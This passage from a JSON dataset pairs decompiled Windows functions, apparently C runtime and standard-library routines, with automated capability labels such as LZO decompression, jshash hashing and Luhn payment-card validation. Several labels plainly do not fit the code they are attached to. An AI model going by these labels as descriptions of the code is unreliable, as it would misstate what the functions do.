        "decompiled_code": "\nuint32_t __fastcall fcn.004063d9(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404250();\n    if (iVar2 == 0) {\ncode_r0x004a49d9:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        uVar4 = fcn.00403751();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402739(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a49d9;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 433
    },
    "00406523": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406523(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.00405d26(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x004a4384:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.00406528();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.00404250();\n            if (iVar3 == 0) {\ncode_r0x004a439c:\n                puVar4 = fcn.004039a4();\n                *puVar4 = 0x16;\n                fcn.00403751();\n                goto code_r0x004a4384;\n            }\n            iVar3 = fcn.00402739(*(param_1 + 0x2c));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x004a439c;\n                iVar3 = *(param_1 + 0x18);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x30) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 422
    },
    "004066d1": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066d1(int32_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_10h;\n    uint lpArguments;\n    int32_t *var_8h;\n    uint8_t *var_4h;\n    \n    lpArguments = 0x19930520;\n    if (arg_ch != NULL) {\n        if ((*arg_ch & 0x10) != 0) {\n            iVar1 = *(*arg_8h + -4);\n            pcVar2 = *(iVar1 + 0x20);\n            arg_ch = *(iVar1 + 0x18);\n            (**0x573000)(*arg_8h + -4);\n            (*pcVar2)();\n            if (arg_ch == NULL) goto code_r0x004832ba;\n        }\n        if ((*arg_ch & 8) != 0) {\n            lpArguments = 0x1994000;\n        }\n    }\ncode_r0x004832ba:\n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0xe06d7363, 1, 3, &lpArguments);\n    return;\n}\n",
        "token_count": 282
    },
    "00406771": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t fcn.00406771(int32_t param_1, uint32_t *param_2, uint32_t param_3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (param_3 != 0) {\n        param_1 = param_1 - param_2;\n        uVar2 = param_2 & 3;\n        while( true ) {\n            if (uVar2 == 0) {\n                while (((param_1 + param_2 & 0xfffU) < 0xffd && (uVar2 = *(param_1 + param_2),  uVar2 == *param_2))) {\n                    bVar3 = param_3 < 4;\n                    param_3 = param_3 - 4;\n                    if (bVar3 || param_3 == 0) {\n                        return 0;\n                    }\n                    param_2 = param_2 + 1;\n                    if ((~uVar2 & uVar2 + 0xfefefeff & 0x80808080) != 0) {\n                        return 0;\n                    }\n                }\n            }\n            uVar1 = *(param_1 + param_2);\n            if (uVar1 != *param_2) {\n                return -(uVar1 < *param_2) | 1;\n            }\n            if (uVar1 == 0) break;\n            param_2 = param_2 + 1;\n            bVar3 = param_3 == 0;\n            param_3 = param_3 - 1;\n            if (bVar3 || param_3 == 0) {\n                return 0;\n            }\n            uVar2 = param_2 & 3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 393
    },
    "004046d8": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.004046d8(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    char **ppcVar10;\n    char **arg_8h_00;\n    char **var_28h;\n    char **var_24h;\n    uint var_20h;\n    char **var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char **var_8h;\n    char *var_4h;\n    \n    if (arg_ch == NULL) {\n        puVar3 = fcn.004039a4();\n        iVar8 = 0x16;\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        pcVar7 = NULL;\n        *arg_ch = 0;\n        iVar8 = *arg_8h;\n        var_28h = NULL;\n        var_24h = NULL;\n        var_20h = 0;\n        ppcVar10 = var_28h;\n        while (var_28h = ppcVar10,  iVar8 != 0) {\n            var_4h = CONCAT13(var_4h >> 0x18, 0x3f2a);\n            iVar8 = fcn.00402b0d(iVar8, &var_4h);\n            if (iVar8 == 0) {\n                iVar8 = fcn.004c4b06(*arg_8h, 0, 0, &var_28h);\n            }\n            else {\n                iVar8 = fcn.004c4cc4(*arg_8h, iVar8, &var_28h);\n            }\n            ppcVar10 = var_28h;\n            var_8h = iVar8;\n            if (iVar8 != 0) goto code_r0x004c478a;\n            arg_8h = arg_8h + 1;\n            iVar8 = *arg_8h;\n        }\n        var_4h = NULL;\n        var_ch = (var_24h - ppcVar10 >> 2) + 1;\n        uVar9 = ~-(var_24h < ppcVar10) & (var_24h - ppcVar10) + 3U >> 2;\n        var_8h = ppcVar10;\n        if (uVar9 != 0) {\n            uVar6 = 0;\n            do {\n                pcVar5 = *var_8h;\n                var_10h = pcVar5 + 1;\n                do {\n                    cVar1 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                } while (cVar1 != '\\0');\n                pcVar7 = pcVar5 + pcVar7 + (1 - var_10h);\n                var_8h = var_8h + 1;\n                uVar6 = uVar6 + 1;\n                var_4h = pcVar7;\n            } while (uVar6 != uVar9);\n        }\n        iVar8 = fcn.00405ea7(var_ch, var_4h, 1);\n        if (iVar8 == 0) {\n            iVar8 = -1;\n            var_8h = 0xffffffff;\n        }\n        else {\n            var_ch = iVar8 + var_ch * 4;\n            var_18h = var_ch;\n            if (ppcVar10 != var_24h) {\n                var_1ch = iVar8 - ppcVar10;\n                var_8h = ppcVar10;\n                do {\n                    var_14h = *var_8h;\n                    var_10h = var_14h;\n                    do {\n                        cVar1 = *var_10h;\n                        var_10h = var_10h + 1;\n                    } while (cVar1 != '\\0');\n                    var_10h = var_10h + (1 - (var_14h + 1));\n                    iVar4 = fcn.004029af(var_ch, var_4h + (var_18h - var_ch), var_14h, var_10h);\n                    if (iVar4 != 0) {\n                        fcn.004035f8(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar8 = (*pcVar2)();\n                        return iVar8;\n                    }\n                    *(var_1ch + var_8h) = var_ch;\n                    var_8h = var_8h + 1;\n                    var_ch = var_ch + var_10h;\n                } while (var_8h != var_24h);\n            }\n            var_8h = NULL;\n            *arg_ch = iVar8;\n            iVar8 = 0;\n        }\n        fcn.00406302(0);\ncode_r0x004c478a:\n        uVar6 = 0;\n        uVar9 = ~-(var_24h < ppcVar10) & var_24h + (3 - ppcVar10) >> 2;\n        arg_8h_00 = ppcVar10;\n        var_1ch = ppcVar10;\n        var_18h = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.00406302(*ppcVar10);\n                uVar6 = uVar6 + 1;\n                ppcVar10 = ppcVar10 + 1;\n                iVar8 = var_8h;\n                arg_8h_00 = var_28h;\n            } while (uVar6 != uVar9);\n        }\n        fcn.00406302(arg_8h_00);\n    }\n    return iVar8;\n}\n",
        "token_count": 1343
    },
    "004060a5": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060a5(code **arg_8h, code **arg_ch)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar3 = 0;\n    uVar2 = ~-(arg_ch < arg_8h) & arg_ch + (3 - arg_8h) >> 2;\n    if (uVar2 != 0) {\n        do {\n            pcVar1 = *arg_8h;\n            if (pcVar1 != NULL) {\n                (**0x573000)();\n                (*pcVar1)();\n            }\n            arg_8h = arg_8h + 1;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != uVar2);\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "004064d8": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.004064d8(int16_t **arg_8h, int16_t **arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *arg_10h;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int16_t **ppiVar8;\n    int16_t **arg_8h_00;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int16_t *var_34h;\n    uint var_30h;\n    int16_t **var_2ch;\n    int16_t **var_28h;\n    uint var_24h;\n    int16_t **var_20h;\n    int16_t *var_1ch;\n    int16_t *var_18h;\n    int16_t **var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    ushort var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_20h = arg_ch;\n    var_14h = arg_8h;\n    if (arg_ch == NULL) {\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        uVar10 = 0;\n        *arg_ch = NULL;\n        piVar5 = *arg_8h;\n        var_2ch = NULL;\n        var_28h = NULL;\n        var_24h = 0;\n        ppiVar8 = var_2ch;\n        while (var_2ch = ppiVar8,  piVar5 != NULL) {\n            var_ch = 0x3f002a;\n            var_8h = 0;\n            var_14h = arg_8h;\n            iVar4 = fcn.004038c8(piVar5, &var_ch);\n            if (iVar4 == 0) {\n                var_10h = fcn.004c4be3(*arg_8h, 0, 0, &var_2ch);\n            }\n            else {\n                var_10h = fcn.004c4fb0(*arg_8h, iVar4, &var_2ch);\n            }\n            ppiVar8 = var_2ch;\n            if (var_10h != 0) goto code_r0x004c4a23;\n            arg_8h = var_14h + 1;\n            piVar5 = *arg_8h;\n        }\n        var_10h = 0;\n        var_1ch = (var_28h - ppiVar8 >> 2) + 1;\n        uVar9 = ~-(var_28h < ppiVar8) & (var_28h - ppiVar8) + 3U >> 2;\n        var_14h = ppiVar8;\n        if (uVar9 != 0) {\n            uVar7 = 0;\n            do {\n                piVar5 = *var_14h;\n                var_18h = piVar5 + 1;\n                do {\n                    iVar1 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                } while (iVar1 != 0);\n                var_10h = var_10h + 1 + (piVar5 - var_18h >> 1);\n                var_14h = var_14h + 1;\n                uVar7 = uVar7 + 1;\n            } while (uVar7 != uVar9);\n        }\n        piVar5 = fcn.00405ea7(var_1ch, var_10h, 2);\n        if (piVar5 == NULL) {\n            var_10h = -1;\n        }\n        else {\n            var_34h = piVar5 + var_1ch * 2;\n            var_1ch = var_34h;\n            var_14h = ppiVar8;\n            if (ppiVar8 != var_28h) {\n                var_ch = piVar5 - ppiVar8;\n                do {\n                    arg_10h = *var_14h;\n                    piVar6 = arg_10h;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != 0);\n                    var_18h = (piVar6 - (arg_10h + 1) >> 1) + 1;\n                    iVar4 = fcn.00405a92(var_1ch, var_10h - (var_1ch - var_34h >> 1), arg_10h, var_18h);\n                    if (iVar4 != 0) {\n                        fcn.004035f8(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    *(var_ch + var_14h) = var_1ch;\n                    var_14h = var_14h + 1;\n                    var_1ch = var_1ch + var_18h;\n                } while (var_14h != var_28h);\n            }\n            var_10h = 0;\n            *var_20h = piVar5;\n        }\n        fcn.00406302(0);\ncode_r0x004c4a23:\n        uVar9 = ~-(var_28h < ppiVar8) & var_28h + (3 - ppiVar8) >> 2;\n        arg_8h_00 = ppiVar8;\n        var_20h = ppiVar8;\n        var_ch = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.00406302(*ppiVar8);\n                uVar10 = uVar10 + 1;\n                ppiVar8 = ppiVar8 + 1;\n                arg_8h_00 = var_2ch;\n            } while (uVar10 != uVar9);\n        }\n        fcn.00406302(arg_8h_00);\n    }\n    fcn.00403085(var_34h);\n    return;\n}\n",
        "token_count": 1430
    },
    "004050f6": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004050f6(uint *arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    _var_10h = fcn.00402ce3(0);\n    fcn.00402cfc(&var_10h);\n    cVar1 = **0x56f458;\n    if (cVar1 == '\\0') {\n        fcn.0040648d(1);\n    }\n    else {\n        *0x56f458 = *0x56f458 + 1;\n        if (cVar1 == '0') {\n            var_10h = \"void\";\n            var_ch = 4;\n            fcn.00405c95(&var_10h);\n        }\n        else if (cVar1 == '2') {\n            arg_8h_00 = fcn.004063b6(&var_10h);\n            fcn.00402eb9(arg_8h_00);\n        }\n        else if (cVar1 == '5') {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 1) = 2;\n            return;\n        }\n    }\n    var_10h = 0x54f5e0;\n    var_ch = 2;\n    fcn.00405c95(&var_10h);\n    *arg_8h = var_8h;\n    arg_8h[1] = var_4h;\n    return;\n}\n",
        "token_count": 364
    },
    "0040599d": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl fcn.0040599d(uint noname_0, uint8_t **arg_ch, uint arg_10h)\n\n{\n    ushort uVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_30h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    puVar3 = &arg_10h;\n    puVar4 = &var_30h;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    uVar1 = fcn.00404f70(**arg_ch, 0, &var_30h);\n    *(in_ECX + 0xc) = uVar1;\n    uVar1 = fcn.00404f70(*arg_ch[1], 0, &var_30h);\n    *(in_ECX + 0xe) = uVar1;\n    fcn.00403085(var_30h);\n    return;\n}\n",
        "token_count": 301
    },
    "00406046": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406046(uint noname_0, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint *arg_10h;\n    uint *puVar4;\n    uint uVar5;\n    uint var_30h;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    puVar1 = fcn.004026d5(&var_30h);\n    arg_10h = in_ECX + 0x18;\n    puVar4 = arg_10h;\n    for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    uVar5 = 0;\n    puVar1 = arg_10h;\n    uVar2 = fcn.004041fb();\n    uVar2 = fcn.0040306c(uVar2, uVar5, puVar1);\n    uVar5 = 0;\n    *(var_4h + 8) = uVar2;\n    puVar1 = arg_10h;\n    uVar2 = fcn.004054d4();\n    uVar2 = fcn.0040306c(uVar2, uVar5, puVar1);\n    *(var_4h + 0xc) = uVar2;\n    uVar2 = fcn.0040306c(\":AM:am:PM:pm\", 0, arg_10h);\n    *(var_4h + 0x10) = uVar2;\n    return;\n}\n",
        "token_count": 393
    },
    "00405ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ce0(uint noname_0, code *arg_ch)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint var_30h;\n    uint var_4h;\n    \n    in_ECX[1] = arg_ch;\n    *in_ECX = vtable.std::codecvt_unsigned_short_int__char__struct__Mbstatet_.0;\n    ppcVar1 = fcn.004026d5(&var_30h);\n    ppcVar3 = in_ECX + 2;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *ppcVar3 = *ppcVar1;\n        ppcVar1 = ppcVar1 + 1;\n        ppcVar3 = ppcVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "0040621c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040621c(uint noname_0, code *arg_ch)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint var_30h;\n    uint var_4h;\n    \n    in_ECX[1] = arg_ch;\n    *in_ECX = vtable.std::codecvt_wchar_t__char__struct__Mbstatet_.0;\n    ppcVar1 = fcn.004026d5(&var_30h);\n    ppcVar3 = in_ECX + 2;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *ppcVar3 = *ppcVar1;\n        ppcVar1 = ppcVar1 + 1;\n        ppcVar3 = ppcVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "00405b28": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b28(uint noname_0, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_30h;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    puVar1 = fcn.004026d5(&var_30h);\n    puVar4 = in_ECX + 0x18;\n    puVar5 = puVar4;\n    for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    uVar2 = fcn.004041fb(0, puVar4);\n    uVar2 = fcn.00401c8f(uVar2);\n    *(var_4h + 8) = uVar2;\n    uVar2 = fcn.004054d4(0, puVar4);\n    uVar2 = fcn.00401c8f(uVar2);\n    *(var_4h + 0xc) = uVar2;\n    uVar2 = fcn.00401c8f(\":AM:am:PM:pm\");\n    *(var_4h + 0x10) = uVar2;\n    return;\n}\n",
        "token_count": 340
    },
    "00402059": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nbool __cdecl fcn.00402059(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_ECX;\n    uint32_t arg_8h_00;\n    uint var_8h;\n    uint var_3h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_8h_00 = uVar1;\n    if ((uVar1 == 0x70) || (arg_10h == 0x70)) {\n        return (uVar1 == 0x70) != (arg_10h != 0x70);\n    }\n    cVar2 = fcn.00402ed7(arg_8h_00);\n    cVar3 = fcn.00402ed7(arg_10h);\n    cVar4 = fcn.00406758(arg_8h_00);\n    cVar5 = fcn.00406758(arg_10h);\n    if (cVar2 == '\\0') {\n        if (cVar3 != '\\0') {\n            return false;\n        }\n        if (cVar4 == '\\0') {\n            if (cVar5 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.00402586(arg_8h_00);\n            cVar3 = fcn.00402586(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar6 = fcn.00402739(arg_8h[3]);\n            iVar7 = fcn.00402739(arg_14h);\n            return iVar6 == iVar7;\n        }\n    }\n    else if (cVar2 != cVar3) {\n        return false;\n    }\n    if (cVar4 == cVar5) {\n        cVar2 = fcn.00401889(*in_ECX, in_ECX[1], arg_8h_00, arg_8h[3]);\n        cVar3 = fcn.00401889(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 630
    },
    "00402b58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nbool __cdecl fcn.00402b58(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_ECX;\n    uint32_t arg_8h_00;\n    uint var_8h;\n    uint var_3h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_8h_00 = uVar1;\n    if ((uVar1 == 0x70) || (arg_10h == 0x70)) {\n        return (uVar1 == 0x70) != (arg_10h != 0x70);\n    }\n    cVar2 = fcn.00404a52(arg_8h_00);\n    cVar3 = fcn.00404a52(arg_10h);\n    cVar4 = fcn.00405100(arg_8h_00);\n    cVar5 = fcn.00405100(arg_10h);\n    if (cVar2 == '\\0') {\n        if (cVar3 != '\\0') {\n            return false;\n        }\n        if (cVar4 == '\\0') {\n            if (cVar5 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.0040385a(arg_8h_00);\n            cVar3 = fcn.0040385a(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar6 = fcn.00402739(arg_8h[3]);\n            iVar7 = fcn.00402739(arg_14h);\n            return iVar6 == iVar7;\n        }\n    }\n    else if (cVar2 != cVar3) {\n        return false;\n    }\n    if (cVar4 == cVar5) {\n        cVar2 = fcn.00401889(*in_ECX, in_ECX[1], arg_8h_00, arg_8h[3]);\n        cVar3 = fcn.00401889(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 633
    },
    "00403c1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c1f(uint32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    if (9 < arg_8h) {\n        return 1;\n    }\n    // switch table (10 cases) at 0x4b484e\n    switch(*(arg_8h * 4 + 0x4b484e)) {\n    case 0x4b476a:\n        uVar2 = fcn.00404921(arg_ch, arg_10h);\n        return uVar2;\n    case 0x4b4779:\n        uVar2 = fcn.004020ef(arg_ch, arg_10h);\n        return uVar2;\n    case 0x4b4786:\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f;\n        break;\n    case 0x4b47a4:\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f | 0x7ff00000;\n        break;\n    case 0x4b47bd:\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f | 0x7fffffff;\n        *arg_10h = 0xffffffff;\n        goto code_r0x004b479d;\n    case 0x4b47dc:\n        fcn.00404b24(*(arg_ch + 0x308), arg_10h);\n        return 0;\n    case 0x4b47f3:\n        *arg_10h = 0;\n        arg_10h[1] = 0xfff80000;\n        return 0;\n    case 0x4b4802:\n        *arg_10h = 0;\n        arg_10h[1] = 0;\n        return 1;\n    case 0x4b4811:\n        uVar2 = 2;\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f;\n        goto code_r0x004b4824;\n    case 0x4b4830:\n        uVar2 = 3;\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f | 0x7ff00000;\ncode_r0x004b4824:\n        *arg_10h = 0;\n        arg_10h[1] = uVar1;\n        return uVar2;\n    }\n    *arg_10h = 0;\ncode_r0x004b479d:\n    arg_10h[1] = uVar1;\n    return 0;\n}\n",
        "token_count": 620
    },
    "00404ffc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404ffc(uint16_t *arg_8h, uint16_t **arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    int32_t in_stack_ffffffdc;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = 0;\n    uVar2 = *arg_8h;\n    do {\n        if ((uVar2 != *(iVar3 + 0x5522d8)) && (uVar2 != *(iVar3 + 0x5522e0))) {\n            fcn.004b4cac();\n            return in_stack_ffffffdc;\n        }\n        iVar3 = iVar3 + 2;\n        uVar4 = **arg_ch;\n        uVar2 = uVar4;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar4;\n    } while (iVar3 != 6);\n    fcn.00402ecd(uVar2);\n    uVar4 = **arg_ch;\n    *arg_ch = *arg_ch + 1;\n    *arg_8h = uVar4;\n    if (uVar4 == 0x28) {\n        uVar4 = **arg_ch;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar4;\n        cVar1 = fcn.00403175(arg_8h, arg_ch);\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00403440(arg_8h, arg_ch);\n            uVar4 = *arg_8h;\n            uVar2 = uVar4;\n            if (cVar1 == '\\0') {\n                while ((uVar4 != 0x29 && (uVar4 = uVar2,  uVar4 != 0))) {\n                    if ((9 < uVar2 - 0x30) && (((0x19 < uVar2 - 0x61 && (0x19 < uVar2 - 0x41)) && (uVar4 != 0x5f))))\n                    goto code_r0x004b43d3;\n                    uVar4 = **arg_ch;\n                    *arg_ch = *arg_ch + 1;\n                    *arg_8h = uVar4;\n                    